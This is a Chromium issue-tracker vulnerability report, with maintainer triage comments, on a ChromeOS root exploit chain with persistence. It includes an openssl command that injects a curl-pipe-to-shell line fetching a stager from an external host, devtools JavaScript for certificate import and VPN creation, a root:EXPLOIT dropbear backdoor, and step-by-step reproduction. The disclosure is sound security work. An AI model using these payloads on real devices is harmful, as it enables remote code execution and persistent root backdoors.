# Security: ChromeOS Persistent root Command Execution

| Field | Value |
|-------|-------|
| **Issue ID** | [40093479](https://issues.chromium.org/issues/40093479) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | OS>Systems |
| **Platforms** | ChromeOS |
| **Reporter** | ro...@rorym.cnamara.com |
| **Assignee** | ke...@chromium.org |
| **Created** | 2018-12-16 |
| **Bounty** | $75,000.00 |

## Description

**VULNERABILITY DETAILS**  

It was found to be possible to obtain unrestricted root command execution by repeatedly exploiting shill, via newline injection and a race condition. Persistence was also obtained by exploiting update\_engine’s configuration handling, by writing a file to /run/modprobe.d via a symlink.

**VERSION**  

Version: 70.0.3538.110 (Official Build) (64-bit)  

Platform: 11021.81.0 (Official Build) stable-channel eve  

Firmware: Google\_Eve.9584.160.0  

Device: Pixelbook

**REPRODUCTION CASE**

### initial command execution by replacing the IPSec leftupdown option

The subject of a configured IPSec CA certificate is not adequately sanitized before being inserted into ipsec.conf. This allows for the injection of newlines, and therefore the creation of new configuration stanzas. This includes 'leftupdown', which can be used to execute an arbitrary command.  

The following command can be used to create such a CA:

openssl genrsa -des3 -out ca.key 512  

openssl req -new -x509 -days 365 -key ca.key -out ca.crt -subj "/emailAddress=$(echo -ne 'test=x"\n\tleftupdown=/usr/bin/curl https://chromeos-stager.psma.xyz/stage1.sh|/bin/sh\n\t#/OU=x\n\tkeyexchange=ikev2\n\t#')"

Note that ipsec.conf is shortlived, but the contents of the current configuration block are output in /var/log/net.log so the injection can be seen here. This results in unrestricted command execution as ipsec:ipsec (supplementary groups include, but not limited to, shill).

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/master/vpn-manager/ipsec_manager.cc#415>

### shill command execution by disabling privilege dropping

/run/l2tpipsec\_vpn is used to store the ipsec.conf configuration files, as written by l2tpipsec\_vpn, just before the execution of Strongswan. This directory is owned by shill:shill and has u+rwx,g+rwx permissions. The previous command execution can race the execution of Strongswan to replace the configuration files after they have been written and before Strongswan reads them.

To perform this replacement quickly enough, it was necessary to use the inotify API from a native binary.

To bypass the noexec mount, a code execution gadget was found inside sqlite3, present in ChromeOS. I do not believe that this is an actual sqlite3 exploit, since the functionality it uses is designed for arbitrary code execution anyway. As such, this has been written up separately and can be found attached, along with build scripts for the PoC. The solution is to compile sqlite3 with --disable-load-extension, which disables the library loader used. This is unrelated to the recently released sqlite3 memory corruption exploit.

The noexec bypass consists of creating an anonymous file with memfd\_create, followed by using the /proc/self/fd/N entry to first copy, then execute a binary. It appears that since it is not tied to a mount, the noexec validation in execve does not block it.

The ipsec user cannot delete the contents of the directories inside /run/l2tpipsec\_vpn due to permission issues, but since it has g+w permissions, the directories can be moved out of the way, and new directories are put in place. The directory structure and symlink usage are as follows (for ipsec.conf as an example):

/etc/ipsec.conf -> /run/l2tpipsec\_vpn/current/ipsec.conf -> /run/l2tpipsec\_vpn/scoped\_dir\_XXXXXX/ipsec.conf

For exploitation, the 'current' directory is targeted, by moving it out of the way and repopulating custom configuration files inside this new directory.

strongswan.conf is targeted to disable the privilege drop from shill to ipsec (as default). If the shill vpn-client sandboxing [1] is not in effect, the privilege drop is from root to ipsec. By adding the 'user = shill' (and 'group = shill') line to strongswan.conf, the privileges are not dropped, and a 'leftupdown' line in ipsec.conf will run as shill:shill. If the vpn-client sandboxing is not in effect, 'user = root' can be used here, resulting in full root command execution.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/master/shill/vpn/l2tp_ipsec_driver.cc#231>

### shill library injection via the noexec bypass

Under the new vpn jail, shill has (among other capabilities) CAP\_SETUID and CAP\_SETGID. These capabilities do not stay effective across the execve into the payload executed by the second leftupdown.

To get around this, it's possible to cause Strongswan to load a library at runtime into the main process [1] which has these capabilities in effect. The noexec bypass above can be reused here, as shill can be configured to load /proc/[pid]/exe as a plugin. /proc permissions require that the processes both be running as the same user and group to be able to dereference /proc/[pid]/exe, hence the initial jump from ipsec to shill.

When running as shill, after it has executed the configuration file race, the process will SIGSTOP itself and wait for a signal. This allows strongswan to load the binary. The binary exports C\_GetFunctionList, which is the function that Strongswan attempts to dlsym and execute.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/master/vpn-manager/ipsec_manager.cc#340>

### root command execution via CAP\_SETUID uid\_map and core\_pattern

The C\_GetFunctionList in the loaded binary is run with CAP\_SETUID/CAP\_GETUID as shill:shill. Whilst setuid() is (due to be) restricted, it does not appear that there are any restrictions coming against the other functionality of these capabilities. Namely "write a user ID mapping in a user namespace".

The loaded function will create a new user namespace, set the uid map such that the shill uid inside the namespace maps to uid 0 outside the namespace, and enter the namespace as shill. I believe that this will be allowed by the LSM since the only setuid call is from the uid to the same uid.

### user namespace breakout

The binary is then running as effective root but inside a user namespace. To break out of this, the /proc/sys/kernel/core\_pattern core handler binary is overwritten, and a fork is killed with SIGSEGV to trigger the core handler. The resulting command execution is as real root outside of any namespaces.

### persistence

update\_engine outputs the entire contents of /var/lib/update\_engine/prefs/current-response-signature to /var/log/update\_engine.log. This can be used to persist by symlinking the log to /run/modprobe.d, and appending an 'install uinput [command]' to current-response-signature.

It is necessary to set immutable (chattr +i) current-response-signature to disable any changes, and since a symlink cannot be immutable, the entirety of /var/log was set immutable.

Upon boot, update\_engine is started by upstart on startING system-services, and uinput (which modprobes uinput) is executed on startED system-services, so these actions will happen in order.

### PoC

I have created a multi-stage PoC which is curl-ed by the first command execution and then shared to future stages. The files are as follows:

dropbear - patched dropbear I've used previously. Accepts authentication as root:EXPLOIT  

sshhostkey - required by dropbear  

main.sql - executes /tmp/fusexmp (hardcoded). See below for full explanation.  

stage1.sh - executed as ipsec, as the initial leftupdown. Runs fusexmp via sqlite3  

stage2.sh - executed as shill, as the second leftupdown, or alternatively root if the jail is not in effect. as root will execute stage3.sh, as shill will execute fusexmp via sqlite3  

stage3.sh - executed as full root. remounts /tmp +exec, executes dropbear, installs the persistence, and opens a new chrome window with nassh pointing to localhost.  

fusexmp - Will race via inotify, waiting for the last configuration file to be written before replacing all the files with the appropriate injections depending on the user being run as. If it's running as shill it will SIGSTOP itself at the end for loading, and if ipsec it will wait for a signal to tidy up so shill doesn't have permission issues in future executions. Also contains C\_GetFunctionList used to escalate privileges via CAP\_SETUID and core\_pattern. (note that the filename itself is a holdover from a failed exploit, but is hardcoded in main.sql and does not otherwise impact the exploitation)  

openurl - uses the user's SingletonSocket to open a new window. This is just a post-exploitation nicety.

For more detailed explanations please see the comments in the attached archive.

For unknown reasons, it's not possible to add a client certificate authenticated IPSec VPN directly via an ONC file (ClientCertRef doesn't appear to work as expected). Therefore the exploitation is performed in two stages:

1. Import of the CA and client certificates via chrome://net-internals
2. Creation of the IPSec vpn, followed by 3 connect/disconnect pairs, to account for each privilege escalation, via chrome://settings

payload.txt contains the two javascript snippets to be executed. ‘importONCFile’ on chrome://net-internals, and ‘networkingPrivate’ on chrome://settings  

chromeos-stager.psma.xyz is a public server I have set up to aid in verifying this issue. It contains a web server with all the discussed files, and an ipsec server with the configuration as attached. The server will remain up until this issue is closed.

There is a small amount of unreliability in the chain, likely a combination of race failures and noexec failures. Re-executing is safe and will continue the chain where it left off. For visibility, 'top' will show './5' executed as ipsec, followed by shill for the first two stages, which stay running until their stage is complete. The final stage is dropbear which will run until shutdown or otherwise killed.

I have also attached sample client certificates and ipsec configuration files for a server, but I have also configured a public server for the PoC which should also work. Note that the L2TP authentication need not succeed, since it is not required for leftupdown to be executed. Client certificate authentication is not explicitly part of the chain, but is required so that the CA subject is inserted in the configuration file. The IPSec server must be configured such that the client certificates authenticate successfully. When control is gained over the Strongswan configuration files, PSK authentication is used for ease of development.

### appendix 1: sqlite3 noexec bypass

Sqlite3 allows for loading of external libraries to extend its functionality. This generally requires an exec mount. By using libc (which is on an exec mount) and the 'gets' function, it's possible to overwrite the start of the main database structure (db). The first element is a structure to OS specific function pointers for things like opening files and loading shared libraries (aka pVfs). By overwriting db->pVfs with the location of the first input argument to load\_extension, it's possible to cause future calls to load\_extension to use an attacker controlled struct, and therefore an attacker controlled pointer to the dlopen function.

Whilst the overwrite is performed in the first call to load\_extension, the exploitation triggers in the second call. It was found to be possible to predict the future location of the argument to load\_extension on the heap with about 98% accuracy (20 failures out of 1000). Using this overwrite and the RIP control gained during the call to our controlled function pointer in pVfs, we can execute a stack pivot and perform a rop chain to execute memfd\_create and execve a short script to copy a binary to the resulting memfd and execute it.

Main.sql used above contains an ELF parser and other utility functions to apply the current ASLR offset, and generate the address-to-be-overwritten, which is then passed to gets by writing it out to a file being tail -f'd. A fifo also works but there are restrictions on ChromeOS around the use of fifos so this was avoided. Note that main.sql itself is compiled from a handful of other files written with macros to help understanding.

Any changes to Main.sql will change the offset used to predict the location of the future buffer. In this case, RSI - heap base at the segfault will return the new address. There are no other hardcoded values.

More detail for sqlite can be found in the attached source and sqlite writeup.

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Rory McNamara

## Attachments

- [sqlite3_writeup.txt](attachments/sqlite3_writeup.txt) (text/plain, 7.3 KB)
- [ipsec-server.tar.gz](attachments/ipsec-server.tar.gz) (application/octet-stream, 8.6 KB)
- [payload.txt](attachments/payload.txt) (text/plain, 9.0 KB)
- [src.tar.gz](attachments/src.tar.gz) (application/octet-stream, 9.7 KB)
- [chromeos-stager.tar.gz](attachments/chromeos-stager.tar.gz) (application/octet-stream, 166.5 KB)
- [ipsec_client_net.log](attachments/ipsec_client_net.log) (text/plain, 25.8 KB)

## Timeline

### ke...@chromium.org (2018-12-17)

CC mpdenton@ since there's some sqlite3 fun in here.

### va...@chromium.org (2018-12-17)

wrt modprobe.d, we have https://crbug.com/chromium/780039 to break that component, but we didn't move forward on it.  i guess if we've been bitten twice, that's a good reason to push on it ;).

[Monorail components: OS>Systems Security]

### ke...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### mp...@google.com (2018-12-17)

Ah yes, in Chrome we disable the extension loading mechanism via a defined constant, see https://cs.chromium.org/chromium/src/third_party/sqlite/BUILD.gn?rcl=f78ca8dd16df06993425c3ad83e421dd04a21472&l=139 and associated comment. :(

### ke...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-12-17)

Rory, thanks for again for filing another exploit chain. As with the last chain, I am not sure exactly how you intended for this to be reproduced. I can take a guess but what really helps us diagnose this, and helps the VRP panel understand impact :), is clear step by step reproduction instructions so I know exactly the flow the exploit is intended to go through. For example:

"1) Open chrome://settings.
 2) Click menu option entitled "Foo"
 3) Enter the contents of malicious_crt.crt as the server cert
 4) Leave user cert blank. Enter the following test username and password.
 ...
 5) Observe the following persistent effect"

For example, I could use some high level summary on how such a malicious certificate gets distributed to users, what users are exposed, how they are exposed, etc.

Thank you!
- Greg

### mo...@chromium.org (2018-12-17)

The "root command execution via CAP_SETUID uid_map" aspect should be broken on M71 since this change started enforcing CAP_SETUID hardening restrictions for shill: https://chromium-review.googlesource.com/c/chromiumos/platform2/+/1222569

Also, regarding

Whilst setuid() is (due to be) restricted, it does not appear that there are any restrictions coming against the other functionality of these capabilities. Namely "write a user ID mapping in a user namespace".

we do actually restrict such things* as of CL:1055871. See https://chromium.googlesource.com/chromiumos/third_party/kernel/+/chromeos-4.4/security/chromiumos/lsm.c#600

*I've tested the described scenario manually (as part of repro'ing crbug.com/884917) and everything looked to be working during my manual tests

### ke...@chromium.org (2018-12-17)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-12-17)

CCing benchan@ and briannorris@ since the whole chain starts with an IPSec certificate and we could use some help there.

### ke...@chromium.org (2018-12-17)

Per c#10, with the CAP_SETUID hardening restrictions, the exploit should no longer be able to set up a namespace and mess with the mappings.

### ro...@rorym.cnamara.com (2018-12-17)

https://crbug.com/chromium/915541#c10: Apologies, my steps are a bit messy.

1. On chrome://net-internals, execute the following in dev-tools. This will install the client and CA certificates. This can't be done on chrome://settings as installing certificates on this page requires the file selector. The CA contains the newline injection, and the client certificate is just one that will authenticate against my server.

chrome.send('importONCFile', ['{"Type": "UnencryptedConfiguration","Certificates": [{"GUID": "{CACACACA-CACA-CACA-CACACACACACACACA}","Type": "Authority","X509": "MIICXzCCAgmgAwIBAgIJAIfCzPI8tiQwMA0GCSqGSIb3DQEBCwUAMIGKMWYwZAYJKoZIhvcNAQkBFld0ZXN0PXgiCglsZWZ0dXBkb3duPS91c3IvYmluL2N1cmwgaHR0cHM6Ly9jaHJvbWVvcy1zdGFnZXIucHNtYS54eXovc3RhZ2UxLnNofC9iaW4vc2gKCSMxIDAeBgNVBAsMF3gKCWtleWV4Y2hhbmdlPWlrZXYyCgkjMB4XDTE4MTIxNTE2MzI1OVoXDTE5MTIxNTE2MzI1OVowgYoxZjBkBgkqhkiG9w0BCQEWV3Rlc3Q9eCIKCWxlZnR1cGRvd249L3Vzci9iaW4vY3VybCBodHRwczovL2Nocm9tZW9zLXN0YWdlci5wc21hLnh5ei9zdGFnZTEuc2h8L2Jpbi9zaAoJIzEgMB4GA1UECwwXeAoJa2V5ZXhjaGFuZ2U9aWtldjIKCSMwXDANBgkqhkiG9w0BAQEFAANLADBIAkEAt3Di/2oNivxOR9AXouHXRbLTXtNJGjf0+6BP6ydWuPDNwcJirK8mjdJudxc9KXJTxSsSlT+3DfvVdCW9aTmjwwIDAQABo1AwTjAdBgNVHQ4EFgQUGRMtJPcckan0homqI6NcUz+nVK4wHwYDVR0jBBgwFoAUGRMtJPcckan0homqI6NcUz+nVK4wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAANBADV1vuuaW3tvCFeu9WsUzKN9CkmsavNn1DfcHQFFCKJ4RIfLbA1M164nGikAmA8XV4IPilJsGKdtC82ivzUtr3I="},{"GUID": "{11111111-1111-1111-1111111111111111}","Type": "Client","PKCS12": "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"}]}', ""])


2. On chrome://settings, execute the following. This will add a new vpn connection with the just-added certificates. The server is one of mine and will succeed in authentication. There is nothing special about the server, the configs are attached above, it just allows for a successful connection.

chrome.networkingPrivate.getCertificateLists(certs => {
var PKCS11Id = certs.userCertificates.filter(cert => cert.issuedBy == "Internet Widgits Pty Ltd")[0].PKCS11Id;
var CACert = certs.serverCaCertificates.filter(cert => cert.issuedTo.startsWith("x"))[0].pem;
chrome.networkingPrivate.createNetwork(false, {
  "Name": "exploit",
  "Priority":1,
  "Type": "VPN",
  "VPN": {
    "Type": "L2TP-IPsec",
    "IPsec": {
      "AuthenticationType": "Cert",
      "Group": "groupname",
      "ClientCertType": "PKCS11Id",
      "ClientCertPKCS11Id": PKCS11Id,
      "ServerCAPEMs": [CACert],
      "IKEVersion": 2,
      "SaveCredentials": true,
    },
    "L2TP": {
      "Username": "username",
      "Password": "password",
      "SaveCredentials": true
    },
    "Host": "chromeos-stager.psma.xyz",
    "AutoConnect": false
  }
}, (guid)=>{})})

3. Connect to the VPN. /var/log/net.log should show the newline injection (Search for '[CFG]   leftupdown=/usr/bin/curl')
4. After about 3 seconds, disconnect from the VPN (speed depends on network latency, and also the sqlite exploit is a little slow. There is no UI indication that IPsec has succeeded, since L2TP won't)
5. In top (crosh), you should be able to see a process named './5', with a parent of init, running as ipsec.
6. Connect to the VPN again. net.log should show that the ipsec config has been replaced (Search for '[CFG]   leftupdown=/bin/sh /tmp/stage2.sh')
7. Again, after about 3 seconds, disconnect from the VPN.
8. In top (crosh), you should now see dropbear running as root, with a parent of init. You can log into dropbear on localhost with root:EXPLOIT
9. Observe that /var/log/update_engine.log is a symlink to /run/modprobe.d, and that /var/lib/update_engine/prefs/current-response-signature has a modprobe.conf 'install' line at the end.
10. On reboot, these lines will be written to /run/modprobe.d as part of the update_engine log, and executed by the uinput upstart job. Dropbear will again be running with the same credentials.

If the shill vpn jail is in effect, steps 3, 4 and 5 will need repeating so that the './5' is re-executed as shill.

In terms of malicious exploitation, some form of XSS (universal or otherwise) on chrome://net-internals and chrome://settings would be required. If it is just my error, it may be possible to simplify this to just chrome://net-internals, but I was not able to get a client certificate authed IPSec/L2TP VPN configured successfully with an ONC file, hence the two steps. The disconnects and reconnects can be automated, as see in payload.txt above.

Please let me know if I can clarify further.

### ke...@chromium.org (2018-12-18)

Thanks. I can see the initial stage1.sh in the cert, but the ./5 process never executes and it never makes it to stage.2sh. Any idea what could be wrong?

2018-12-18T00:35:21.208673+00:00 INFO charon[9256]: 07[CFG] received stroke: add connection 'managed'
2018-12-18T00:35:21.208707+00:00 INFO charon[9256]: 07[CFG] conn managed
2018-12-18T00:35:21.208735+00:00 INFO charon[9256]: 07[CFG]   left=%any
2018-12-18T00:35:21.208762+00:00 INFO charon[9256]: 07[CFG]   leftcert=%smartcard1@crypto_module:16000F74976EA261FFAFAB007FDAE07FE8800B9E
2018-12-18T00:35:21.208796+00:00 INFO charon[9256]: 07[CFG]   leftupdown=/usr/bin/curl https://chromeos-stager.psma.xyz/stage1.sh|/bin/sh
2018-12-18T00:35:21.208823+00:00 INFO charon[9256]: 07[CFG]   right=35.192.19.172
2018-12-18T00:35:21.208850+00:00 INFO charon[9256]: 07[CFG]   rightid=%any
2018-12-18T00:35:21.208878+00:00 INFO charon[9256]: 07[CFG]   rightca=emailAddress=test=x
2018-12-18T00:35:21.208911+00:00 INFO charon[9256]: 07[CFG]   ike=aes128-sha256-modp3072,aes128-sha1-modp2048,3des-sha1-modp1536,3des-sha1-modp1024
2018-12-18T00:35:21.208940+00:00 INFO charon[9256]: 07[CFG]   esp=aes128gcm16,aes128-sha256,aes128-sha1,3des-sha1,aes128-md5,3des-md5
2018-12-18T00:35:21.208968+00:00 INFO charon[9256]: 07[CFG]   dpddelay=30
2018-12-18T00:35:21.208995+00:00 INFO charon[9256]: 07[CFG]   dpdtimeout=150
2018-12-18T00:35:21.209029+00:00 INFO charon[9256]: 07[CFG]   sha256_96=no
2018-12-18T00:35:21.209055+00:00 INFO charon[9256]: 07[CFG]   mediation=no
2018-12-18T00:35:21.209082+00:00 INFO charon[9256]: 07[CFG]   keyexchange=ikev2

I do see later on:

2018-12-18T00:35:51.238720+00:00 ERR l2tpipsec_vpn[9254]: IPsec connection timed out
2018-12-18T00:35:52.239637+00:00 INFO l2tpipsec_vpn[9254]: Shutting down...


### va...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### mn...@chromium.org (2018-12-18)

Critical severity per https://chromium.googlesource.com/chromiumos/docs/+/master/security_severity_guidelines.md since this defeats verified boot 

### ro...@rorym.cnamara.com (2018-12-18)

https://crbug.com/chromium/915541#c15: Based on the server logs there are some packets being lost. This configuration works for me over a standard NATted LAN, but may not work over a more complex configuration such as a corporate network.

Since I can't remotely debug this it might be worth using the above configuration files and creating your own IPSec server/HTTP server for testing.

### sh...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-18)

This is a critical security issue. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### mn...@chromium.org (2018-12-18)

[Empty comment from Monorail migration]

### kb...@google.com (2018-12-18)

